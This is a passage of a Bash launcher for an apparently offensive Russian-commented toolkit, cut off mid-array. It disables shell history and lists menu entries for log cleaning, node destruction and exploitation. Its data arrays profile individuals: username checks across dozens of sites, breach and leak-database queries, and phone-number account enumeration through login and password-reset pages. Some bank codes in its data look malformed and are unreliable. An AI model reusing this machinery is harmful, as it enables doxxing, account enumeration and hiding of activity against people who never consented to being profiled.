#!/bin/bash
# --- PRIME MASTER LAUNCHER v35.0m1 ---
CURRENT_VERSION="35.5"
G='\033[0;32m'; Y='\033[1;33m'; R='\033[0;31m'; B='\033[0;34m'; NC='\033[0m'
set +o history

# Эта функция изолирует регулярку от Bash
is_valid() {
    local input_val="$1"
    local regex_pattern="${!2}"
    
    # Perl понимает твою регулярку как есть, без ошибок grep
    perl -e 'exit 0 if $ARGV[0] =~ m|'"$regex_pattern"'|; exit 1' "$input_val" 2>/dev/null
    return $?
}


CURRENT_IP=$(ip route get 1 2>/dev/null | awk '{print $7}')
[ -z "$CURRENT_IP" ] && CURRENT_IP="127.0.0.1"


# --- CORE PATH INITIALIZATION ---
# Сначала определяем, где мы находимся
if [[ -n "$TERMUX_VERSION" ]]; then
    # Среда: Termux (Android)
    BASE_DIR="$HOME/core-prime-tools"
    PRIME_LOOT="$HOME/prime_loot"
    PRIME_SHARE="$HOME/prime_share"
    # Расширяем PATH для бинарников Termux
    PATH="$PATH:/data/data/com.termux/files/usr/bin"
else
    # Среда: Стандартный Linux
    # Проверяем, есть ли права root, чтобы решить, куда писать
    if [[ $EUID -eq 0 ]]; then
        BASE_DIR="/root/core-prime-tools"
        PRIME_LOOT="/root/prime_loot"
        PRIME_SHARE="/root/prime_share"
    else
        BASE_DIR="$HOME/core-prime-tools"
        PRIME_LOOT="$HOME/prime_loot"
        PRIME_SHARE="$HOME/prime_share"
    fi
fi

# Вторичные директории
MOD_DIR="$BASE_DIR/modules"

# Создание инфраструктуры (без ошибок доступа)
mkdir -p "$BASE_DIR" "$MOD_DIR" "$PRIME_LOOT" "$PRIME_SHARE" 2>/dev/null

export BASE_DIR MOD_DIR PRIME_LOOT PRIME_SHARE


# ==============================================================================
# 12. ГЛОБАЛЬНАЯ МАТРИЦА МЕНЮ (MENU REGISTRY)
# ==============================================================================
GLOBAL_MENU_REGISTRY=(
    "MAIN:CYBER_OPS|menu_cyber_ops" "MAIN:INTELLIGENCE|menu_intelligence"
    "MAIN:CRYPTO_LAB|menu_crypto_lab" "MAIN:NET_INFRA|menu_net_infra"
    "MAIN:FIN_SHIELD|menu_financial_shield" "MAIN:STEALTH_COMMS|menu_stealth_comms"
    "MAIN:NEXUS|menu_nexus_correlation" "MAIN:SYSTEM|menu_system_core"
    "MAIN:CORE_LAB|menu_core_lab" "MAIN:FORENSICS|menu_forensics"
    "MAIN:PASSWORD|run_pass_lab" "MAIN:ANTI_MALWARE|run_anti_malware_engine"
    "MAIN:REANIMATOR|run_cross_os_reanimator" "MAIN:EXIT|exit_script"

    "INTELLIGENCE:Smart_OSINT_Engine|run_smart_osint_engine" "INTELLIGENCE:Network_Intelligence|run_network_analyzer"
 

    "SYSTEM:System_Info|run_system_info" "SYSTEM:Sync_DNS|core_network_dns_sync"
    "SYSTEM:Update_OS|run_sys_update" "SYSTEM:Update_Launcher|run_update_prime"
    "SYSTEM:Clean_Logs|run_logs_cleaner" "SYSTEM:System_Pulse|run_system_pulse"
    "SYSTEM:Printer_Repaire|run_printer_repair_nexus"
    

    "FORENSICS:ADAPTIVE_ANALYZE|run_auto_forensics" "FORENSICS:Disk_Raw_Recovery|run_raw_recovery"
    "FORENSICS:Document_Sanitizer|run_doc_cleaner" "FORENSICS:Forensic_Loot|run_loot_viewer"

    "CYBER_OPS:Ghost_Commander|run_ghost_commander" "CYBER_OPS:PC_Control|pc_password_recovery"
   #"CYBER_OPS:Ultimate_Exploit|run_prime_exploiter_v5" "CYBER_OPS:Omega_Auditor|run_prime_auditor_v2"
    "CYBER_OPS:Unified_Auditor|run_smart_auditor_nexus"

    "CRYPTO_LAB:Hash_Analyzer|run_stealth_stream_analyzer" "CRYPTO_LAB:File_Encryptor|run_file_cryptor"
    "CRYPTO_LAB:SSH_Key_Gen|run_ssh_keygen"

    #"NET_INFRA:Device_Hack|run_device_hack" "NET_INFRA:Mesh_Bridge|run_mesh_bridge" "NET_INFRA:Server_Control|run_servers"
    "NET_INFRA:Mesh_Bridge|run_mesh_bridge" "NET_INFRA:Server_Control|run_servers"

    "CORE_LAB:Forensic_Nexus_System |run_forensic_nexus"
    "CORE_LAB:Packet_Forge|run_packet_forge"  "CORE_LAB:WiFi_Pulse|run_wifi_pulse" 

    "FIN_SHIELD:IBAN_Validator|run_iban_analyzer" 
    #"FIN_SHIELD:Gambit_Strategy|run_gambit_info"
    #"FIN_SHIELD:Transaction_Audit|run_trans_audit" "FIN_SHIELD:Secure_Wallet|run_wallet_manager"

    "STEALTH_COMMS:Live_Node_AV|run_av_server" "STEALTH_COMMS:Shared_Node_Store|run_share_server"
    "STEALTH_COMMS:Upload_Portal|run_upload_server" "STEALTH_COMMS:Node_Destroy|run_node_clean"
     "STEALTH_COMMS:AIO_SERVER|run_aio_server"

    "NEXUS:Full_Pipeline|run_nexus_full_pipeline"
)

# ==============================================================================
# ULTIMATE OSINT & RECON MATRIX (OPEN & AUTH-FREE SOURCES)
# ==============================================================================
# Формат: "URL|ТИП_ДАННЫХ|КАТЕГОРИЯ|ОПИСАНИЕ"
GLOBAL_OSINT_SERVICES=(
    # --- Инфраструктура и Геолокация ---
    "https://rdap.arin.net/registry/ip/%IP%|IP_DATA|NET|ASN/ISP Registration"
    "https://ipapi.co/%IP%/json/|GEO_DATA|NET|Geolocation & Provider"
    "https://ip-api.com/json/%IP%|GEO_DATA|NET|Full Geo Details"
    
    # --- DNS и WAF детекция ---
    "https://dns.google/resolve?name=%TARGET%&type=A|DNS_DATA|INFRA|IPv4 Records"
    "https://dns.google/resolve?name=%TARGET%&type=TXT|DNS_DATA|INFRA|TXT/SPF/DKIM"
    "https://dns.google/resolve?name=%TARGET%&type=MX|DNS_DATA|INFRA|Mail Servers"
    
    # --- WHOIS и История домена ---
    "https://api.viewdns.info/whois/?domain=%TARGET%&output=json|WHOIS_DATA|DOMAIN|Whois JSON"
    "https://api.viewdns.info/iphistory/?domain=%TARGET%&output=json|HISTORY_DATA|DOMAIN|IP History"
    "https://api.viewdns.info/dnsrecord/?domain=%TARGET%&output=json|DNS_DATA|INFRA|Deep DNS Records"
    
    # --- Безопасность и Репутация ---
    "https://check.spamhaus.org/ip/%IP%/|REPUTATION_DATA|SEC|Spamhaus Reputation"
    "https://otx.alienvault.com/api/v1/indicators/IPv4/%IP%/general|THREAT_DATA|SEC|AlienVault OTX (Public)"
    
    # --- SSL/TLS Инфо ---
    "https://crt.sh/?q=%TARGET%&output=json|CERT_DATA|DOMAIN|Certificate Transparency Logs"
)

# ==============================================================================
# 1. ГЛОБАЛЬНАЯ МАТРИЦА ПЛАТФОРМ ДЛЯ КРОСС-СПРАВОК (ULTIMATE OSINT CORE)
# ==============================================================================
# Формат: "URL_ПРЕФИКС|ТИП_ПРОВЕРКИ|МАРКЕР_ОШИБКИ|КАТЕГОРИЯ|НАЗВАНИЕ_СЕРВИСА"
GLOBAL_OSINT_SITES=(
    # --- Социальные сети и Мессенджеры (Social & Messengers) ---
    "https://t.me/|HTTP_CODE|404|SOCIAL|Telegram"
    "https://www.instagram.com/|HTTP_CODE|404|SOCIAL|Instagram"
    "https://x.com/|TEXT_ABSENT|page doesn’t exist|SOCIAL|X (Twitter)"
    "https://vk.com/|TEXT_ABSENT|ID_NOT_FOUND|SOCIAL|VKontakte"
    "https://ok.ru/|HTTP_CODE|404|SOCIAL|Odnoklassniki"
    "https://www.facebook.com/|HTTP_CODE|404|SOCIAL|Facebook"
    "https://www.tiktok.com/@|TEXT_ABSENT|not found|SOCIAL|TikTok"
    
    # --- Профессиональные, ИТ-платформы и Репозитории (Dev & Tech) ---
    "https://github.com/|HTTP_CODE|404|DEV|GitHub"
    "https://gitlab.com/|HTTP_CODE|404|DEV|GitLab"
    "https://bitbucket.org/|HTTP_CODE|404|DEV|BitBucket"
    "https://www.linkedin.com/in/|HTTP_CODE|404|DEV|LinkedIn"
    "https://habr.com/ru/users/|HTTP_CODE|404|DEV|Habr"
    "https://stackoverflow.com/users/story/|HTTP_CODE|404|DEV|StackOverflow"
    "https://hub.docker.com/u/|HTTP_CODE|404|DEV|DockerHub"
    "https://pypi.org/user/|HTTP_CODE|404|DEV|PyPI"
    
    # --- Блоги, Форумы и Контент-платформы (Blogs & Forums) ---
    "https://www.reddit.com/user/|HTTP_CODE|404|BLOG|Reddit"
    "https://medium.com/@|HTTP_CODE|404|BLOG|Medium"
    "https://pikabu.ru/@|HTTP_CODE|404|BLOG|Pikabu"
    "https://vc.ru/u/|HTTP_CODE|404|BLOG|VCRu"
    "https://www.tumblr.com/|HTTP_CODE|404|BLOG|Tumblr"
    "https://archive.org/details/@|HTTP_CODE|404|BLOG|Archive.org"
    
    # --- Видео, Музыка и Стриминг (Media & Streaming) ---
    "https://www.youtube.com/@|HTTP_CODE|404|MEDIA|YouTube"
    "https://www.twitch.tv/|HTTP_CODE|404|MEDIA|Twitch"
    "https://vimeo.com/|HTTP_CODE|404|MEDIA|Vimeo"
    "https://soundcloud.com/|HTTP_CODE|404|MEDIA|SoundCloud"
    "https://open.spotify.com/user/|HTTP_CODE|404|MEDIA|Spotify"
    "https://www.dailymotion.com/|HTTP_CODE|404|MEDIA|Dailymotion"
    
    # --- Дизайн, Фото, Портфолио (Design & Creative) ---
    "https://www.pinterest.com/|HTTP_CODE|404|DESIGN|Pinterest"
    "https://www.behance.net/|HTTP_CODE|404|DESIGN|Behance"
    "https://www.deviantart.com/|HTTP_CODE|404|DESIGN|DeviantArt"
    "https://www.flickr.com/people/|HTTP_CODE|404|DESIGN|Flickr"
    "https://www.artstation.com/|HTTP_CODE|404|DESIGN|ArtStation"
    "https://unsplash.com/@|HTTP_CODE|404|DESIGN|Unsplash"
    
    # --- Игровые платформы (Gaming Infrastructure) ---
    "https://steamcommunity.com/id/|TEXT_ABSENT|The specified profile could not be found|GAMING|Steam"
    "https://www.chess.com/member/|HTTP_CODE|404|GAMING|Chess.com"
    "https://psnprofiles.com/|HTTP_CODE|404|GAMING|PSNProfiles"
    
    # --- Фриланс и Коммерция (Freelance & SaaS) ---
    "https://www.fl.ru/users/|HTTP_CODE|404|COMMERCE|FL.ru"
    "https://www.freelancer.com/u/|HTTP_CODE|404|COMMERCE|Freelancer"
    "https://www.patreon.com/|HTTP_CODE|404|COMMERCE|Patreon"
    "https://www.fiverr.com/|HTTP_CODE|404|COMMERCE|Fiverr"
)

# ==============================================================================
# 2. МАТРИЦА ПОЧТОВЫХ ПРОВАЙДЕРОВ ДЛЯ ВАЛИДАЦИИ И OSINT (ULTIMATE EMAIL CORE)
# ==============================================================================
GLOBAL_EMAIL_DOMAINS=(
    # --- Международные гиганты (Global Providers) ---
    "gmail.com|GLOBAL|Google Mail"
    "yahoo.com|GLOBAL|Yahoo Mail"
    "outlook.com|GLOBAL|Microsoft Outlook"
    "hotmail.com|GLOBAL|Microsoft Hotmail Legacy"
    "icloud.com|GLOBAL|Apple iCloud"
    "aol.com|GLOBAL|AOL Mail"
    "zoho.com|GLOBAL|Zoho Mail"
    
    # --- Регион СНГ (CIS Mail Services) ---
    "mail.ru|CIS|Mail.ru Group"
    "internet.ru|CIS|Mail.ru Clean Domain"
    "bk.ru|CIS|Mail.ru Subdomain (BK)"
    "inbox.ru|CIS|Mail.ru Subdomain (Inbox)"
    "list.ru|CIS|Mail.ru Subdomain (List)"
    "yandex.ru|CIS|Yandex Mail (RU)"
    "yandex.kz|CIS|Yandex Mail (KZ)"
    "yandex.by|CIS|Yandex Mail (BY)"
    "ya.ru|CIS|Yandex Short Domain"
    "rambler.ru|CIS|Rambler Mail"
    "ukr.net|CIS|Ukr.net Mail"
    
    # --- Криптографические и защищенные сервисы (Encrypted & Secure) ---
    "proton.me|SECURE|ProtonMail Modern"
    "protonmail.com|SECURE|ProtonMail Legacy"
    "tutanota.com|SECURE|Tutanota Secure"
    "tuta.com|SECURE|Tuta Mail Modern"
    "mailfence.com|SECURE|Mailfence Crypt"
    "startmail.com|SECURE|StartMail Private"
    
    # --- Локальные и ISP провайдеры (Western Europe & US Regional) ---
    "gmx.de|EUROPE|GMX Mail (Germany)"
    "gmx.net|EUROPE|GMX Mail International"
    "web.de|EUROPE|Web.de (Germany)"
    "orange.fr|EUROPE|Orange S.A. (France)"
    "wanadoo.fr|EUROPE|Orange Legacy (France)"
    "free.fr|EUROPE|Free Telecom (France)"
    "sfr.fr|EUROPE|SFR Box Mail (France)"
    "laposte.net|EUROPE|La Poste (France)"
    "libero.it|EUROPE|Libero Mail (Italy)"
    "t-online.de|EUROPE|Deutsche Telekom"
    "comcast.net|US_ISP|Comcast Cable"
    "verizon.net|US_ISP|Verizon Telecom"
    "att.net|US_ISP|AT&T Webmail"
    
    # --- Сервисы временных и одноразовых почт (Disposable / Burner Email) ---
    "yopmail.com|DISPOSABLE|YOPmail Burner"
    "mailinator.com|DISPOSABLE|Mailinator Public"
    "10minutemail.com|DISPOSABLE|10MinuteMail"
    "temp-mail.org|DISPOSABLE|Temp-Mail Engine"
    "guerrillamail.com|DISPOSABLE|GuerrillaMail"
    "trashmail.com|DISPOSABLE|TrashMail Manager"
)

   
# ==============================================================================
# 3. МЕЖДУНАРОДНЫЕ ТЕЛЕФОННЫЕ КОДЫ ДЛЯ OSINT И ГЕО-АНАЛИЗА (ULTIMATE TELEPHONY)
# ==============================================================================
GLOBAL_PHONE_CODES=(
    # --- Зона СНГ и Ближнее Зарубежье (CIS Region) ---
    "+7|RU|Россия"
    "+77|KZ|Казахстан"
    "+380|UA|Украина"
    "+375|BY|Беларусь"
    "+994|AZ|Азербайджан"
    "+374|AM|Армения"
    "+995|GE|Грузия"
    "+996|KG|Кыргызстан"
    "+992|TJ|Таджикистан"
    "+993|TM|Туркменистан"
    "+998|UZ|Узбекистан"
    "+373|MD|Молдова"
    
    # --- Западная и Центральная Европа (Europe Zone) ---
    "+33|FR|Франция"
    "+44|GB|Великобритания"
    "+49|DE|Германия"
    "+48|PL|Польша"
    "+34|ES|Испания"
    "+39|IT|Италия"
    "+41|CH|Швейцария"
    "+31|NL|Нидерланды"
    "+32|BE|Бельгия"
    "+43|AT|Австрия"
    "+420|CZ|Чехия"
    "+36|HU|Венгрия"
    "+40|RO|Румыния"
    "+351|PT|Португалия"
    "+30|GR|Греция"
    
    # --- Балтия и Скандинавия (Baltic & Scandinavia) ---
    "+370|LT|Литва"
    "+371|LV|Латвия"
    "+372|EE|Эстония"
    "+46|SE|Швеция"
    "+47|NO|Норвегия"
    "+45|DK|Дания"
    "+358|FI|Финляндия"
    
    # --- Северная и Латинская Америка (Americas) ---
    "+1|US|США"
    "+1|CA|Канада"
    "+52|MX|Мексика"
    "+55|BR|Бразилия"
    "+54|AR|Аргентина"
    "+57|CO|Колумбия"
    
    # --- Азия и Ближний Восток (Asia & Middle East) ---
    "+90|TR|Турция"
    "+971|AE|ОАЭ"
    "+972|IL|Израиль"
    "+86|CN|Китай"
    "+81|JP|Япония"
    "+82|KR|Южная Корея"
    "+91|IN|Индия"
    "+65|SG|Сингапур"
    "+66|TH|Таиланд"
    "+84|VN|Вьетнам"
    "+62|ID|Индонезия"
    
    # --- Другие Ключевые Регионы (Other Global Regions) ---
    "+61|AU|Австралия"
    "+64|NZ|Новая Зеландия"
    "+27|ZA|ЮАР"
    "+20|EG|Египет"
)

# ==============================================================================
# 11. МАТРИЦА ФИНАНСОВЫХ ИНСТИТУТОВ И БАНКОВСКИХ КОДОВ (ULTIMATE BANK MATRIX)
# ==============================================================================
# Формат: "КОД_BANQUE_ИЛИ_SWIFT_PREFIX|BIC_SWIFT|НАЗВАНИЕ_БАНКА|РЕГИОН"
GLOBAL_BANK_MATRIX=(
    # --- Крупнейшие Французские Банки и Традиционная Сеть (RIB / SEPA FR) ---
    "30002|BNPAFRPP|BNP Paribas|Франция (FR)"
    "30003|SOGEFRPP|Société Générale|Франция (FR)"
    "30004|CAGRFRPP|Crédit Agricole|Франция (FR)"
    "30066|CMCIFRPP|Crédit Mutuel|Франция (FR)"
    "10278|POSSFRPP|La Banque Postale|Франция (FR)"
    "30007|CEPACFRP|BPCE (Banque Populaire / Caisse d'Epargne)|Франция (FR)"
    "16108|LCLXFRPP|LCL (Le Crédit Lyonnais)|Франция (FR)"
    "10207|CHAFFRPP|Crédit du Nord|Франция (FR)"
    "30056|HSBCFRPP|HSBC Continental Europe (France)|Франция (FR)"
    "42559|BICPFRPP|Banque Palatine|Франция (FR)"
    
    # --- Французские Необанки и Финтех (Digital & FinTech FR) ---
    "14518|BOURFRPP|BoursoBank (ex-Boursorama)|Франция (FR)"
    "11708|FOTEFRPP|Fortuneo|Франция (FR)"
    "17515|N26EFR2X|N26 (French Branch)|Франция (FR)"
    "16575|REVOFR21|Revolut (French Branch)|Франция (FR)"
    "17315|NICKFRPP|Compte Nickel (Financière des Paiements)|Франция (FR)"
    "17218|QONTFRPP|Qonto (Olinda SAS)|Франция (FR)"
    "17525|BUNQFRWW|Bunq (French Branch)|Франция (FR)"
    "11328|HELLFRPP|Hello Bank!|Франция (FR)"
    
    # --- Международные и Европейские Гиганты (Global SWIFT) ---
    "BARC|BARCGB2L|Barclays Bank|Великобритания (UK)"
    "HSBC|HSBCHGB2L|HSBC Holdings|Великобритания (UK)"
    "DEUT|DEUTDEFF|Deutsche Bank|Германия (DE)"
    "COMM|COERDEFF|Commerzbank|Германия (DE)"
    "INGB|INGBNL2A|ING Group|Нидерланды (NL)"
    "SANTA|BSCHESMM|Banco Santander|Испания (ES)"
    "CHAS|CHASUS33|JPMorgan Chase|США (US)"
    "CITI|CITIUS33|Citigroup|США (US)"
    "UBSW|UBSWCHZH|UBS Group|Швейцария (CH)"
    "BNPA|BNPABEBB|BNP Paribas Fortis|Бельгия (BE)"
    
        # --- Крупнейшие Банки СНГ (SWIFT & Национальные Системы) ---
    "SBER|SABRRUMM|Сбербанк|Россия (RU)"
    "VTBR|VTBRRU2M|ВТБ|Россия (RU)"
    "ALFA|ALFARU2A|Альфа-Банк|Россия (RU)"
    "TCSB|TCSBRUM1|Т-Банк (Тинкофф)|Россия (RU)"
    "VBRR|VBRRRUM1|ВБРР|Россия (RU)"
    "KZBK|KSBKKZKX|Kaspi Bank|Казахстан (KZ)"
    "HALK|HSBKKZKX|Halyk Bank|Казахстан (KZ)"
    "BCCK|KREDKZKX|Банк ЦентрКредит|Казахстан (KZ)"
    "BAPB|BAPBBY2X|Белагропромбанк|Беларусь (BY)"
    "ASB|AKBBBY2X|Беларусбанк|Беларусь (BY)"
    "PBUA|PBUAUA2X|ПриватБанк|Украина (UA)"

)


# ==============================================================================
# 4. КРИПТОГРАФИЧЕСКИЕ СИГНАТУРЫ ДЛЯ БЛОКЧЕЙН-ТРЕКИНГА (ULTIMATE CRYPTO CORE)
# ==============================================================================
GLOBAL_CRYPTO_TYPES=(
    "\b0x[0-9a-fA-F]{40}\b|Ethereum (ETH) / Binance Smart Chain (BSC) / Polygon / ERC-20"
    "\b[13][a-km-zA-HJ-NP-Z1-9]{26,33}\b|Bitcoin (BTC) Legacy / P2SH Address"
    "\bbc1[a-zA-Z0-9]{25,39}\b|Bitcoin (BTC) Native SegWit (Bech32)"
    "\bbc1[pP][a-zA-Z0-9]{58}\b|Bitcoin (BTC) Taproot / Schnorr Signatures (Bech32m)"
    "\bT[a-zA-Z0-9]{33}\b|TRON (TRX) / Tether USD (USDT-TRC20)"
    "\b4[0-9a-zA-Z]{94}\b|Monero (XMR) Stealth Cryptonote Wallet"
    "\b[49][1-9A-HJ-NP-Za-km-z]{94,105}\b|Monero (XMR) Integrated Wallet Address"
    "\br[0-9a-zA-Z]{24,34}\b|Ripple (XRP) Ledger Address"
    "\bD[a-km-zA-HJ-NP-Z1-9]{33}\b|Dogecoin (DOGE) Address"
    "\b[L3][a-km-zA-HJ-NP-Z1-9]{26,33}\b|Litecoin (LTC) Legacy / Script Address"
    "\bltc1[a-zA-Z0-9]{25,43}\b|Litecoin (LTC) Native SegWit Address"
)


# ==============================================================================
# 7. ВЕРИФИКАЦИЯ МЕЖДУНАРОДНЫХ БАНКОВСКИХ РЕКВИЗИТОВ (ULTIMATE FININTEL NODES)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|РЕГИОН|НАЗВАНИЕ_УЗЛА"
# Плейсхолдеры: {IBAN}, {BIC}, {BIK} автоматически подменяются ядром.
GLOBAL_API_FINANCE_NODES=(
    # --- Международные валидаторы структуры IBAN (Global Verification) ---
    "https://api.openiban.org/validate/{IBAN}|GET|JSON|GLOBAL|OpenIBAN Community Engine"
    "https://api.ibanapi.com/v1/validate/{IBAN}?api_key=free|GET|JSON|GLOBAL|IBANAPI Public Gateway"
    "https://api.validiban.com/v1/check/{IBAN}|GET|JSON|GLOBAL|ValidIBAN Border Node"
    
    # --- Европейские шлюзы и реестры SEPA (Франция / Еврозона) ---
    "https://relais.epsoft.fr/api/iban/{IBAN}|GET|JSON|EUROPE|EPSoft SEPA Router (FR)"
    "https://api.bankauth.co/v1/iban/verify?target={IBAN}|GET|JSON|EUROPE|BankAuth Compliance Node"
    "https://api.upclink.com/v1/iban/{IBAN}|GET|JSON|EUROPE|UPCLink EuroBank Validator"
    
    # --- Декодеры BIC / SWIFT кодов (Routing & SWIFT Intel) ---
    "https://api.swiftcodesfinder.com/v1/swift/{BIC}|GET|JSON|SWIFT|SWIFT Codes Finder Core"
    "https://bank-code.net/api/v1/bic/{BIC}|GET|JSON|SWIFT|BankCode Net International"
    "https://api.api-ninjas.com/v1/bank?bic={BIC}|GET|JSON|SWIFT|ApiNinjas Bank Infrastructure"
    
    # --- Национальные реестры и БИК (СНГ / Центральные Банки) ---
    "http://www.cbr.ru/scripts/XML_bic.asp?bic={BIK}|GET|XML|CIS_RU|Центральный Банк РФ (Официальный)"
    "https://bik-info.ru/api.html?bik={BIK}|GET|JSON|CIS_RU|BikInfo National Registry"
    "https://api.post.kz/api/v1/banks/bic/{BIK}|GET|JSON|CIS_KZ|АО Казпочта / Нацбанк РК"
)

# ==============================================================================
# УЛЬТИМАТИВНАЯ МАТРИЦА ВНЕШНИХ API-ЭНДПОИНТОВ (GLOBAL OSINT API ENDPOINTS)
# ==============================================================================
# Формат структуры: "БАЗОВЫЙ_URL|СИСТЕМНОЕ_ИМЯ_ПЛАТФОРМЫ"

# ==============================================================================
# 1. АНАЛИЗ ПАРАМЕТРОВ МОБИЛЬНЫХ НОМЕРОВ (ULTIMATE PHONE INTEL NODES)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|РЕГИОН|НАЗВАНИЕ_УЗЛА"
# Плейсхолдер {PHONE} должен содержать номер в международном формате без знака "+"
GLOBAL_API_PHONE_NODES=(
    # --- Международные и Европейские шлюзы (Global / EU Telecom Intel) ---
    "https://api.numlookupapi.com/v1/validate/{PHONE}?api_key=free|GET|JSON|GLOBAL|NumLookupProvider Core"
    "https://api.phone-validator.net/api/v2/verify?PhoneNumber={PHONE}&CountryCode=FR|GET|JSON|EUROPE|PhoneValidator EU"
    "https://ipqualityscore.com/api/json/phone/free/{PHONE}|GET|JSON|GLOBAL|IPQualityScore Phone Fraud Radar"
    
    # --- Локальные и государственные реестры СНГ (CIS Регион) ---
    "https://htmlweb.ru/geo/api.php?json&telcod={PHONE}|GET|JSON|CIS_RU|HtmlWeb GeoAPI National"
    "https://rosreestr.space/api/v1/phone/{PHONE}|GET|JSON|CIS_RU|Rosreestr Space Telecom Decoder"
    "https://api.mtt.ru/reestr/get_operator?phone={PHONE}|GET|JSON|CIS_RU|АО МТТ Официальный Реестр"
    "https://opendata.kz/api/v1/telecom/operator/{PHONE}|GET|JSON|CIS_KZ|OpenData Kazakhstan (Казпочта)"
)


# ==============================================================================
# GLOBAL PHONE FORENSICS MATRIX (ULTIMATE NUM-RESOLVER CORE)
# ==============================================================================
# Формат записи вектора: "BASE_URL|CHECK_TYPE|MATCH_CRITERIA|CATEGORY|SERVICE_NAME"
# Доступные типы проверок:
#   - DOM_MATCH  : Маркер ИМЕЕТСЯ в теле ответа (Подтверждение существования)
#   - DOM_ABSENT : Маркер ОТСУТСТВУЕТ в теле ответа (Инверсия ошибки / Успех)
#   - HTTP_CODE  : Проверка жесткого статус-кода ответа сервера
# ==============================================================================
GLOBAL_PHONE_SERVICES=(
    # --- СЛОЙ 1: ГЛОБАЛЬНЫЕ МЕССЕНДЖЕРЫ И СВЯЗЬ (MESSENGER ZONE) ---
    "https://t.me/+|DOM_MATCH|tg://resolve?phone|MESSENGER|Telegram"
    "https://wa.me/|DOM_MATCH|whatsapp://send|MESSENGER|WhatsApp"
    "https://api.whatsapp.com/send?phone=|DOM_MATCH|action-button|MESSENGER|WhatsApp Web Gateway"
    "https://viber.click/|HTTP_CODE|200|MESSENGER|Viber Link Routing"
    
    # --- СЛОЙ 2: КОРПОРАТИВНЫЕ ШЛЮЗЫ И ПАНЕЛИ РЕГИСТРАЦИИ (INFRASTRUCTURE) ---
    # Viber Business Panel: если номер зарегистрирован в системе связи, API не выкинет ошибку формы
    "https://account.viber.com/ru/create-account?phone=|DOM_ABSENT|error-message|INFRASTRUCTURE|Viber Business Panel"
    # Международный корпоративный шлюз Skype/Microsoft (Проверка валидности Live ID)
    "https://signup.live.com/signup?id=64855&phone=|DOM_ABSENT|phone-error|INFRASTRUCTURE|Microsoft Skype ID"
    # Панель восстановления доступа к экосистеме Профессионалов (Проверка привязки аккаунта)
    "https://www.linkedin.com/checkpoint/rp/request-password-reset?phone=|DOM_MATCH|verification-sent|INFRASTRUCTURE|LinkedIn Vector"
    
    # --- СЛОЙ 3: МЕЖДУНАРОДНЫЕ ПЛАТФОРМЫ И СОЦИАЛЬНЫЕ СЕТИ (SOCIAL GRAPH) ---
    # Идентификация через форму верификации старых учетных записей Yahoo
    "https://login.yahoo.com/config/login?.src=fpctx&login=|DOM_ABSENT|username-not-found|SOCIAL|Yahoo Mail Engine"
    # Форма проверки мобильных шлюзов Pinterest
    "https://www.pinterest.com/password/reset/?search_param=|DOM_ABSENT|user_not_found|SOCIAL|Pinterest"
    # Детекция следов в международной B2B-сети контактов Xing
    "https://login.xing.com/recovery?email=|DOM_MATCH|verification_code_sent|SOCIAL|Xing Business Network"
    
    # --- СЛОЙ 4: ПУБЛИЧНЫЕ РЕЕСТРЫ, СПРАВОЧНИКИ И КРАУД-МАРКЕРЫ (PUBLIC DIRECTORY) ---
    # Международная поисковая маска TrueCaller (веб-зеркало агрегатора номеров)
    "https://www.truecaller.com/search/id/|DOM_MATCH|profile-card|DIRECTORY|TrueCaller Public Profile"
    # Британский и европейский реестры спам-активности и жалоб
    "https://who-called.co.uk/Number/|DOM_MATCH|searched|DIRECTORY|WhoCalled UK Database"
    "https://www.unknownphone.com/phone/|DOM_MATCH|comments-list|DIRECTORY|UnknownPhone International"
    # Федеральный реестр телефонных пулов СНГ (Определение оператора и легитимности диапазона)
    "https://num.mtt.ru/|DOM_MATCH|Результаты поиска|DIRECTORY|MTT Register Check"
    # Информационный трекер отзывов о телефонных узлах
    "https://zvonili.com/phone/|DOM_MATCH|информация о номере|DIRECTORY|Zvonili Com Trace"
    
    # --- СЛОЙ 5: СЕТЕВЫЕ СЕРВИСЫ И ИНСТРУМЕНТЫ АУТЕНТИФИКАЦИИ (SERVICES) ---
    # Проверка привязки номера к экосистеме Mail.Ru через форму восстановления
    "https://auth.mail.ru/cgi-bin/passremind?phone=|DOM_ABSENT|not_found|SERVICES|Mail.Ru Ecosystem"
    # Международная детекция привязки криптокошельков и финансовых шлюзов Paxful
    "https://paxful.com/password-reset?phone=|DOM_ABSENT|no-account-found|SERVICES|Paxful Crypto Wallet"
)

# ==============================================================================
# 2. МОНИТОРИНГ ГЛОБАЛЬНЫХ БАЗ УТЕЧЕК И COMB (ULTIMATE BREACH INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|ВЕКТОР_ДАННЫХ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдер {TARGET} автоматически заменяется очищенным вектором (Email/Phone/User)
GLOBAL_API_BREACH_NODES=(
    # --- Публичные реестры агрегаторов утечек (COMB Core) ---
    "https://api.proxynova.com/comb?query={TARGET}|GET|JSON|ALL|ProxyNova COMB Registry"
    "https://leakcheck.io/api/v2/public/use/{TARGET}|GET|JSON|ALL|LeakCheck Open Engine v2"
    
    # --- Международные OSINT-шлюзы верификации компрометации ---
    "https://api.breachdirectory.org/v1/check?term={TARGET}|GET|JSON|ALL|BreachDirectory Security Node"
    "https://api.haveibeenpwned.com/v3/breachedaccount/{TARGET}|GET|JSON|EMAIL|HaveIBeenPwned Core (Requires Header)"
    "https://intelx.io/API/v1/search/phone?phone={TARGET}|GET|JSON|PHONE|IntelligenceX Phone Leak Matrix"
    
    # --- Локальные и специализированные базы (СНГ & Текстовые дампы) ---
    "https://leaklookup.com/api/v1/search|POST|JSON|ALL|LeakLookup Cross-Platform Gate"
    "https://api.pwned.ru/v1/check/{TARGET}|GET|JSON|ALL|PwnedRu CIS Breach Index"
)

# ==============================================================================
# 3. АНАЛИТИКА СЕТЕВОЙ ИНФРАСТРУКТУРЫ И ПРОВАЙДЕРОВ (ULTIMATE IP/ASN INTEL)
# ==============================================================================
# Формат: "URL_С_ПЛЕЙСХОЛДЕРОМ|МЕТОД|ТИП_ОТВЕТА|ВЕКТОР_ДАННЫХ|НАЗВАНИЕ_УЗЛА"
# Плейсхолдеры {IP} и {ASN} автоматически заменяются сигнатурным ядром.
GLOBAL_API_NETWORK_NODES=(
    # --- Глобальные геораспределенные декодеры IP (GeoIP & ISP Intel) ---
